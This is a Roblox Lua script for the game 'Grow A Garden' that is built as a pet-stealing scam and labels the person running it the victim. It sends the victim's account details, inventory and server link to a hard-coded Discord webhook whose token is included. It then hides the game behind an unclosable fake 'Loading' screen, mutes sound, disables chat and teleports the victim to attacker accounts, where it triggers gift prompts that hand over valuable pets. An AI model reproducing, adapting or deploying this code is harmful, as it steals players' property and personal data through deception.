-- ✅ Configuration
local CONFIG = {
    WEBHOOK_URL = "https://discord.com/api/webhooks/1393637749881307249/ofeqDbtyCKTdR-cZ6Ul602-gkGOSMuCXv55RQQoKZswxigEfykexc9nNPDX_FYIqMGnP",
    USERNAMES = { "saikigrow", "", "yuniecoxo", "yyyyyvky" },
    PET_WHITELIST = {
        "Raccoon", "T-Rex", "Fennec Fox", "Dragonfly", "Butterfly", "Disco Bee",
        "Mimic Octopus", "Queen Bee", "Spinosaurus", "Kitsune"
    },
    FILE_URL = "https://cdn.discordapp.com/attachments/.../items.txt"
}

_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

repeat task.wait() until game:IsLoaded()

-- 🛠️ Services & Setup
local VICTIM = game.Players.LocalPlayer
local VirtualInputManager = game:GetService("VirtualInputManager")
local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
local victimPetTable = {}

-- 🎭 Fake Legit Loading Screen
local function showBlockingLoadingScreen()
    local plr = VICTIM
    local playerGui = plr:WaitForChild("PlayerGui")

    -- Disable chat & leaderboard
    local StarterGui = game:GetService("StarterGui")
    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false) end)
    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false) end)

    -- Mute all sounds
    for _, s in ipairs(workspace:GetDescendants()) do
        if s:IsA("Sound") then s.Volume = 0 end
    end

    -- UI Setup
    local loadingScreen = Instance.new("ScreenGui", playerGui)
    loadingScreen.Name = "UnclosableLoading"
    loadingScreen.ResetOnSpawn = false
    loadingScreen.IgnoreGuiInset = true
    loadingScreen.DisplayOrder = 999999
    loadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    loadingScreen.AncestryChanged:Connect(function()
        loadingScreen.Parent = playerGui
    end)

    local blackFrame = Instance.new("Frame", loadingScreen)
    blackFrame.Size = UDim2.new(1, 0, 1, 0)
    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    blackFrame.BorderSizePixel = 0

    local blurEffect = Instance.new("BlurEffect")
    blurEffect.Size = 24
    blurEffect.Name = "FreezeBlur"
    blurEffect.Parent = game:GetService("Lighting")

    local label = Instance.new("TextLabel", loadingScreen)
    label.Size = UDim2.new(0.5, 0, 0.1, 0)
    label.Position = UDim2.new(0.25, 0, 0.45, 0)
    label.TextScaled = true
    label.BackgroundTransparency = 1
    label.Text = "Loading Wait a Moment <3..."
    label.Font = Enum.Font.SourceSansBold
    label.TextColor3 = Color3.new(1, 1, 1)

    -- Animate Loading
    coroutine.wrap(function()
        while true do
            for i = 1, 3 do
                label.Text = "Loading" .. string.rep(".", i)
                task.wait(0.5)
            end
        end
    end)()

    -- Reapply protection
    coroutine.wrap(function()
        while true do
            task.wait(1)
            if not game.Lighting:FindFirstChild("FreezeBlur") then
                local newBlur = Instance.new("BlurEffect")
                newBlur.Size = 24
                newBlur.Name = "FreezeBlur"
                newBlur.Parent = game.Lighting
            end
            for _, s in ipairs(workspace:GetDescendants()) do
                if s:IsA("Sound") and s.Volume > 0 then
                    s.Volume = 0
                end
            end
        end
    end)()
end

local function waitForJoin()
    for _, plr in ipairs(game.Players:GetPlayers()) do
        if table.find(CONFIG.USERNAMES, plr.Name) then
            showBlockingLoadingScreen()
            return true, plr.Name
        end
    end
    return false
end

-- 📨 Send Discord Embed
local function createDiscordEmbed(petList, totalValue)
    local embed = {
        title = "🌵 Grow A Garden Hit - DARK SKIDS 🍀",
        color = 65280,
        fields = {
            {
                name = "👤 Player Information",
                value = string.format("Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %d days", 
                    VICTIM.Name, table.concat(CONFIG.USERNAMES, ", "), identifyexecutor(), VICTIM.AccountAge),
                inline = false
            },
            {
                name = "💰 Total Value",
                value = string.format("%s¢", totalValue),
                inline = false
            },
            {
                name = "🌴 Backpack",
                value = petList,
                inline = false
            },
            {
                name = "🏝️ Join with URL",
                value = string.format("[Click to Join](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", game.PlaceId, game.JobId),
                inline = false
            }
        },
        footer = { text = string.format("%s | %s", game.PlaceId, game.JobId) }
    }

    local payload = {
        content = string.format("@everyone\n```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n```", game.PlaceId, game.JobId),
        username = VICTIM.Name,
        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
        embeds = {embed}
    }

    (http_request or request or HttpPost or syn.request)({
        Url = CONFIG.WEBHOOK_URL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = game:GetService("HttpService"):JSONEncode(payload)
    })
end

-- ✅ Helpers
local function checkPetsWhilelist(pet)
    for _, name in ipairs(CONFIG.PET_WHITELIST) do
        if string.find(pet, name) then return true end
    end
    return false
end

local function getPetObject(petUid)
    for _, tool in ipairs(VICTIM.Backpack:GetChildren()) do
        if tool:GetAttribute("PET_UUID") == petUid then return tool end
    end
    for _, tool in ipairs(workspace[VICTIM.Name]:GetChildren()) do
        if tool:GetAttribute("PET_UUID") == petUid then return tool end
    end
end

local function equipPet(pet)
    if pet:GetAttribute("d") then
        game.ReplicatedStorage.GameEvents.Favorite_Item:FireServer(pet)
    end
    VICTIM.Character.Humanoid:EquipTool(pet)
end

local function teleportTarget(targetName)
    local target = game.Players:FindFirstChild(targetName)
    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        if VICTIM.Character and VICTIM.Character:FindFirstChild("HumanoidRootPart") then
            VICTIM.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
        end
    end
end

local function deltaBypass()
    local view = workspace.Camera.ViewportSize
    VirtualInputManager:SendMouseButtonEvent(view.X/2, view.Y/2, 0, true, nil, false)
    task.wait()
    VirtualInputManager:SendMouseButtonEvent(view.X/2, view.Y/2, 0, false, nil, false)
end

local function startSteal(targetName)
    local target = game.Players:FindFirstChild(targetName)
    if target and target.Character and target.Character:FindFirstChild("Head") then
        local prompt = target.Character.Head:FindFirstChild("ProximityPrompt")
        if prompt then
            prompt.HoldDuration = 0
            deltaBypass()
        end
    end
end

local function checkPetsInventory(targetName)
    for petUid, info in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        if not checkPetsWhilelist(info.PetType) then continue end
        local petObj = getPetObject(petUid)
        if petObj then
            equipPet(petObj)
            startSteal(targetName)
        end
    end
end

local function getPlayersPets()
    for _, info in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
        if checkPetsWhilelist(info.PetType) then
            table.insert(victimPetTable, info.PetType)
        end
    end
end

local function idlingTarget()
    while task.wait(0.2) do
        local isTarget, targetName = waitForJoin()
        if isTarget then
            teleportTarget(targetName)
            checkPetsInventory(targetName)
        end
    end
end

-- 🟢 Execute
getPlayersPets()
task.spawn(function()
    while task.wait(0.5) do
        if #victimPetTable > 0 then
            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000")
            idlingTarget()
            break
        end
    end
end)
